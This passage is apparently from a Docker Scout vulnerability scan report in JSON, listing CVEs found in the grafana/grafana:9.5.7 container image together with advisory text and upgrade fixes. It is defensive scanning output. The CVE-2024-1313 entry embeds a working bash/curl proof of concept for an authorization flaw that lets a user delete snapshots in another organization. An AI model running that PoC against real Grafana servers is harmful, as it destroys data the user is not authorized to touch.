            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-7264",
          "value": "CVE-2024-7264",
          "url": "https://scout.docker.com/v/CVE-2024-7264?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-7264?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ]
    },
    {
      "id": "d8926e4430e5ca5e1ab67880c7673889a0c4d8c996b495c5888ff9444b1a0f22",
      "category": "container_scanning",
      "message": "CVE-2024-8096 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-8096",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-8096",
          "value": "CVE-2024-8096",
          "url": "https://scout.docker.com/v/CVE-2024-8096?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-8096?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ]
    },
    {
      "id": "642688f18db01576b9ab89f51a2c2fde46bae134a100f5662a3ac5742714eab6",
      "category": "container_scanning",
      "message": "CVE-2024-9681 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-9681",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-9681",
          "value": "CVE-2024-9681",
          "url": "https://scout.docker.com/v/CVE-2024-9681?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-9681?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D8.9.0-r0"
        }
      ]
    },
    {
      "id": "710f5ca162afdfbe154f4409de09015af641267c793e3b28714e442912745934",
      "category": "container_scanning",
      "message": "CVE-2025-47906 on stdlib@1.20.6",
      "description": "If the PATH environment variable contains paths which are executables (rather than just directories), passing certain strings to LookPath (\"\", \".\", and \"..\"), can result in the binaries listed in the PATH being unexpectedly returned.",
      "cve": "CVE-2025-47906",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.23.12",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-47906",
          "value": "CVE-2025-47906",
          "url": "https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3C1.23.12"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3C1.23.12"
        }
      ]
    },
    {
      "id": "dcc1ddf035121bf59e13730508396f1958dab6b7c4a5e2708f0cf23fa37d8cc4",
      "category": "container_scanning",
      "message": "CVE-2024-24786 on google.golang.org/protobuf@1.28.1",
      "description": "The protojson.Unmarshal function can enter an infinite loop when unmarshaling certain forms of invalid JSON. This condition can occur when unmarshaling into a message which contains a google.protobuf.Any value, or when the UnmarshalOptions.DiscardUnknown option is set.",
      "cve": "CVE-2024-24786",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade google.golang.org/protobuf@1.28.1 to 1.33.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/google.golang.org/protobuf@1.28.1"
          },
          "version": "1.28.1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24786",
          "value": "CVE-2024-24786",
          "url": "https://scout.docker.com/v/CVE-2024-24786?s=github&n=protobuf&ns=google.golang.org&t=golang&vr=%3C1.33.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24786?s=github&n=protobuf&ns=google.golang.org&t=golang&vr=%3C1.33.0"
        }
      ]
    },
    {
      "id": "5d0f1079ebbd884a0ab189d472aeaf8a8360893b5d9d38ff03e1f96f179f0da4",
      "category": "container_scanning",
      "message": "CVE-2023-4822 on github.com/grafana/grafana@9.5.7",
      "description": "Grafana is an open-source platform for monitoring and observability. The vulnerability impacts instances with several organizations, and allows a user with Organization Admin permissions in one organization to change the permissions associated with Organization Viewer, Organization Editor and Organization Admin roles in all organizations.\n\nIt also allows an Organization Admin to assign or revoke any permissions that they have to any user globally.\n\nThis means that any Organization Admin can elevate their own permissions in any organization that they are already a member of, or elevate or restrict the permissions of any other user.\n\nThe vulnerability does not allow a user to become a member of an organization that they are not already a member of, or to add any other users to an organization that the current user is not a member of.",
      "cve": "CVE-2023-4822",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-4822",
          "value": "CVE-2023-4822",
          "url": "https://scout.docker.com/v/CVE-2023-4822?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D10.1.5"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-4822?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D10.1.5"
        }
      ]
    },
    {
      "id": "19c771161654b5a08bba2c53f346df32190937611b5cadb0cadca1138e84b77f",
      "category": "container_scanning",
      "message": "CVE-2024-35255 on github.com/azure/azure-sdk-for-go@1.2.0",
      "description": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.",
      "cve": "CVE-2024-35255",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/azure/azure-sdk-for-go@1.2.0 to 1.6.0-beta.4.0.20240610221955-50774cd97099",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/azure/azure-sdk-for-go@1.2.0#sdk/azidentity"
          },
          "version": "1.2.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-35255",
          "value": "CVE-2024-35255",
          "url": "https://scout.docker.com/v/CVE-2024-35255?s=github&n=sdk%2Fazidentity&ns=github.com%2Fazure%2Fazure-sdk-for-go&t=golang&vr=%3C1.6.0-beta.4.0.20240610221955-50774cd97099"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-35255?s=github&n=sdk%2Fazidentity&ns=github.com%2Fazure%2Fazure-sdk-for-go&t=golang&vr=%3C1.6.0-beta.4.0.20240610221955-50774cd97099"
        }
      ]
    },
    {
      "id": "86b0451c807899369f569651564ff5670a3234f311dbe0e1de390b431e797bb6",
      "category": "container_scanning",
      "message": "CVE-2025-4673 on stdlib@1.20.6",
      "description": "Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information.",
      "cve": "CVE-2025-4673",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.23.10",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-4673",
          "value": "CVE-2025-4673",
          "url": "https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"
        }
      ]
    },
    {
      "id": "77bc733d531b1036a9f7328b7b9a0d4ece8096432b6c763f75092cb809dcde05",
      "category": "container_scanning",
      "message": "CVE-2023-44487 on golang.org/x/net@0.8.0",
      "description": "## HTTP/2 Rapid reset attack\nThe HTTP/2 protocol allows clients to indicate to the server that a previous stream should be canceled by sending a RST_STREAM frame. The protocol does not require the client and server to coordinate the cancellation in any way, the client may do it unilaterally. The client may also assume that the cancellation will take effect immediately when the server receives the RST_STREAM frame, before any other data from that TCP connection is processed.\n\nAbuse of this feature is called a Rapid Reset attack because it relies on the ability for an endpoint to send a RST_STREAM frame immediately after sending a request frame, which makes the other endpoint start working and then rapidly resets the request. The request is canceled, but leaves the HTTP/2 connection open. \n\nThe HTTP/2 Rapid Reset attack built on this capability is simple: The client opens a large number of streams at once as in the standard HTTP/2 attack, but rather than waiting for a response to each request stream from the server or proxy, the client cancels each request immediately.\n\nThe ability to reset streams immediately allows each connection to have an indefinite number of requests in flight. By explicitly canceling the requests, the attacker never exceeds the limit on the number of concurrent open streams. The number of in-flight requests is no longer dependent on the round-trip time (RTT), but only on the available network bandwidth.\n\nIn a typical HTTP/2 server implementation, the server will still have to do significant amounts of work for canceled requests, such as allocating new stream data structures, parsing the query and doing header decompression, and mapping the URL to a resource. For reverse proxy implementations, the request may be proxied to the backend server before the RST_STREAM frame is processed. The client on the other hand paid almost no costs for sending the requests. This creates an exploitable cost asymmetry between the server and the client.\n\nMultiple software artifacts implementing HTTP/2 are affected. This advisory was originally ingested from the `swift-nio-http2` repo advisory and their original conent follows.\n\n## swift-nio-http2 specific advisory\nswift-nio-http2 is vulnerable to a denial-of-service vulnerability in which a malicious client can create and then reset a large number of HTTP/2 streams in a short period of time. This causes swift-nio-http2 to commit to a large amount of expensive work which it then throws away, including creating entirely new `Channel`s to serve the traffic. This can easily overwhelm an `EventLoop` and prevent it from making forward progress.\n\nswift-nio-http2 1.28 contains a remediation for this issue that applies reset counter using a sliding window. This constrains the number of stream resets that may occur in a given window of time. Clients violating this limit will have their connections torn down. This allows clients to continue to cancel streams for legitimate reasons, while constraining malicious actors.",
      "cve": "CVE-2023-44487",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.17.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-44487",
          "value": "CVE-2023-44487",
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.17.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.17.0"
        }
      ]
    },
    {
      "id": "288d945c12567c34735b4710fc681876801d52ef6cecbadd5b9e46b39ef3aa66",
      "category": "container_scanning",
      "message": "CVE-2025-27144 on github.com/go-jose/go-jose@3.0.0",
      "description": "### Impact\nWhen parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, \".\") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.\n\n### Patches\nVersion 4.0.5 fixes this issue\n\n### Workarounds\nApplications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.\n\n### References\nThis is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.",
      "cve": "CVE-2025-27144",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-jose/go-jose@3.0.0 to 3.0.4",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
          },
          "version": "3.0.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-27144",
          "value": "CVE-2025-27144",
          "url": "https://scout.docker.com/v/CVE-2025-27144?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.4"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-27144?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.4"
        }
      ]
    },
    {
      "id": "c84960d87f0f436675aad6719a703110501ad2b8ec1321f79ee97718f281bb15",
      "category": "container_scanning",
      "message": "CVE-2024-1313 on github.com/grafana/grafana@9.5.7",
      "description": "### Summary\nThe ***DELETE /api/snapshots/{key}*** endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot\n\n\n### Details\nAn attacker (a user without organization affiliation or with a \"no basic role\" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. \nIf an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. \n\n![Screenshot 2024-01-19 at 3 50 23 PM](https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png)\n\n### Precondition\nTo exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.\n\nWhen [creating a snapshot through the API](https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/), users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as \"customer_key_123\" or \"admin_snap\" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.\n\nIn addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.\n\n### PoC\n```\n#!/bin/bash -x\n\n# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}\n# 2d92c726-bf3c-4f20-b979-37bdf81d68c7\n\n# Authentication stage\n\n# User A - Grafana Admin\nuser_a_token=\"YWRtaW46YWRtaW4xMjM=\"\n\n# User B - User with no permissions , which is not part of any org\nuser_b_token=\"YmJiOmJiYmJiYmJiYg==\"\n\n# Create snapshot\ncurrent_date=$(date +%Y-%m-%d-%H-%M-%S)\nrandom_string=\"random-${current_date}\"\nsnapshot_data='{\"dashboard\":{\"annotations\":{\"list\":[{\"name\":\"Annotations & Alerts\",\"enable\":true,\"iconColor\":\"rgba(0, 211, 255, 1)\",\"snapshotData\":[],\"type\":\"dashboard\",\"builtIn\":1,\"hide\":true}]},\"editable\":true,\"fiscalYearStartMonth\":0,\"graphTooltip\":0,\"id\":1517,\"links\":[],\"liveNow\":false,\"panels\":[{\"aliasColors\":{},\"bars\":false,\"dashLength\":10,\"dashes\":false,\"datasource\":null,\"fill\":1,\"fillGradient\":0,\"gridPos\":{\"h\":7,\"w\":24,\"x\":0,\"y\":0},\"hiddenSeries\":false,\"id\":4,\"legend\":{\"alignAsTable\":true,\"avg\":false,\"current\":true,\"max\":false,\"min\":false,\"rightSide\":true,\"show\":true,\"total\":false,\"values\":true},\"lines\":true,\"linewidth\":1,\"links\":[],\"nullPointMode\":\"null\",\"options\":{\"alertThreshold\":true},\"percentage\":false,\"pluginVersion\":\"10.2.3\",\"pointradius\":2,\"points\":false,\"renderer\":\"flot\",\"seriesOverrides\":[],\"snapshotData\":[{\"fields\":[{\"config\":{},\"name\":\"time\",\"type\":\"time\",\"values\":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],\"meta\":{},\"refId\":\"A\"}],\"spaceLength\":10,\"stack\":false,\"steppedLine\":false,\"targets\":[],\"thresholds\":[],\"timeRegions\":[],\"title\":\"Simple dummy streaming example\",\"tooltip\":{\"shared\":true,\"sort\":0,\"value_type\":\"individual\"},\"type\":\"graph\",\"xaxis\":{\"mode\":\"time\",\"show\":true,\"values\":[]},\"yaxes\":[{\"format\":\"short\",\"logBase\":1,\"show\":true},{\"format\":\"short\",\"logBase\":1,\"show\":true}],\"yaxis\":{\"align\":false}}],\"refresh\":\"\",\"schemaVersion\":39,\"snapshot\":{\"timestamp\":\"2024-01-04T15:03:04.128Z\"},\"tags\":[],\"templating\":{\"list\":[]},\"time\":{\"from\":\"2024-01-04T15:02:08.132Z\",\"to\":\"2024-01-04T15:03:08.132Z\",\"raw\":{\"from\":\"now-1m\",\"to\":\"now\"}},\"timepicker\":{\"refresh_intervals\":[\"5s\",\"10s\",\"30s\",\"1m\",\"5m\",\"15m\",\"30m\",\"1h\",\"2h\",\"1d\"],\"time_options\":[\"5m\",\"15m\",\"1h\",\"6h\",\"12h\",\"24h\",\"2d\",\"7d\",\"30d\"]},\"timezone\":\"\",\"title\":\"Simple Streaming Example Snapshot\",\"uid\":\"TXSTREZ\",\"version\":1,\"weekStart\":\"\"},\"name\":\"Simple Streaming Example Snapshot\", \"expires\":0, \"key\":\"admin_key\"}'\n\ncreate_snapshot_response=$(curl -s -X POST \"http://localhost:3000/api/snapshots\" -H \"Authorization: Basic ${user_a_token}\" -H \"Content-Type: application/json\" -d \"${snapshot_data}\")\n\n# Extract key from create snapshot response\nkey=$(echo \"$create_snapshot_response\" | jq -r '.key')\n\n# Delete snapshot\ndelete_snapshot_response=$(curl -s -X DELETE \"http://localhost:3000/api/snapshots/${key}\" -H \"Authorization: Basic ${user_b_token}\" -o /dev/null -w \"%{http_code}\")\n\n# Check if the test passed\nif [ \"$delete_snapshot_response\" -eq 200 ]; then\n  echo -e \"\\033[32mTest was passed, BOLA\\033[0m\"\nfi\n\n```\n\n",
      "cve": "CVE-2024-1313",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/grafana/grafana@9.5.7 to 9.5.18",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-1313",
          "value": "CVE-2024-1313",
          "url": "https://scout.docker.com/v/CVE-2024-1313?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D9.5.0%2C%3C9.5.18"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-1313?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D9.5.0%2C%3C9.5.18"
        }
      ]
    },
    {
      "id": "d0f4378ec65623f15d5d4534b19176255350b2cda0f5e3acc9c5a3757b97458a",
      "category": "container_scanning",
      "message": "CVE-2022-21698 on go.opentelemetry.io/contrib/instrumentation@0.37.0",
      "description": "Memory exhaustion in go.opentelemetry.io/contrib/instrumentation",
      "cve": "CVE-2022-21698",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade go.opentelemetry.io/contrib/instrumentation@0.37.0 to 0.44.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/go.opentelemetry.io/contrib/instrumentation@0.37.0#net/http/httptrace/otelhttptrace"
          },
          "version": "0.37.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2022-21698",
          "value": "CVE-2022-21698",
          "url": "https://scout.docker.com/v/CVE-2022-21698?s=golang&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2022-21698?s=golang&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ]
    },
    {
      "id": "ae220146c01534e099840bb9ad7309d0222aa4cf421851cadfff49701f0782af",
      "category": "container_scanning",
      "message": "CVE-2022-30635 on stdlib@1.20.6",
      "description": "Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.",
      "cve": "CVE-2022-30635",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.7",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2022-30635",
          "value": "CVE-2022-30635",
          "url": "https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ]
    },
    {
      "id": "9ccc4799c912d60c38eba6ed5232f9b61d0f6757ca56409c26b5a2645be1be4c",
      "category": "container_scanning",
      "message": "CVE-2023-25151 on go.opentelemetry.io/contrib/instrumentation@0.37.0",
      "description": "Memory exhaustion in go.opentelemetry.io/contrib/instrumentation",
      "cve": "CVE-2023-25151",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade go.opentelemetry.io/contrib/instrumentation@0.37.0 to 0.44.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/go.opentelemetry.io/contrib/instrumentation@0.37.0#net/http/httptrace/otelhttptrace"
          },
          "version": "0.37.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-25151",
          "value": "CVE-2023-25151",
          "url": "https://scout.docker.com/v/CVE-2023-25151?s=golang&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-25151?s=golang&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ]
    },
    {
      "id": "a0dc9cbb3a435458e8600df5f897d5a7d38fd32668eba1b9b28ccb024ce2696a",
      "category": "container_scanning",
      "message": "CVE-2023-37788 on github.com/elazarl/goproxy@0.0.0-20220115173737-adb46da277ac",
      "description": "goproxy prior to pseudoversion 0.0.0-20230731152917-f99041a5c027 was discovered to contain an issue which can lead to a Denial of service (DoS) via unspecified vectors.",
      "cve": "CVE-2023-37788",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/elazarl/goproxy@0.0.0-20220115173737-adb46da277ac to 0.0.0-20230731152917-f99041a5c027",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/elazarl/goproxy@0.0.0-20220115173737-adb46da277ac"
          },
          "version": "0.0.0-20220115173737-adb46da277ac"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-37788",
          "value": "CVE-2023-37788",
          "url": "https://scout.docker.com/v/CVE-2023-37788?s=github&n=goproxy&ns=github.com%2Felazarl&t=golang&vr=%3C0.0.0-20230731152917-f99041a5c027"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-37788?s=github&n=goproxy&ns=github.com%2Felazarl&t=golang&vr=%3C0.0.0-20230731152917-f99041a5c027"
        }
      ]
    },
    {
      "id": "35c5c614e20563801eb121fcee2c8b807c6e082ac08a268ff0b4f4fb503a4295",
      "category": "container_scanning",
      "message": "CVE-2023-38039 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2023-38039",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.3.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-38039",
          "value": "CVE-2023-38039",
          "url": "https://scout.docker.com/v/CVE-2023-38039?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.3.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-38039?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.3.0-r0"
        }
      ]
    },
    {
      "id": "04328ca1b52885a5937f8403742643bc7b80162fa5f830f9e67d4e469c7f99ca",
      "category": "container_scanning",
      "message": "CVE-2023-39325 on golang.org/x/net@0.8.0",
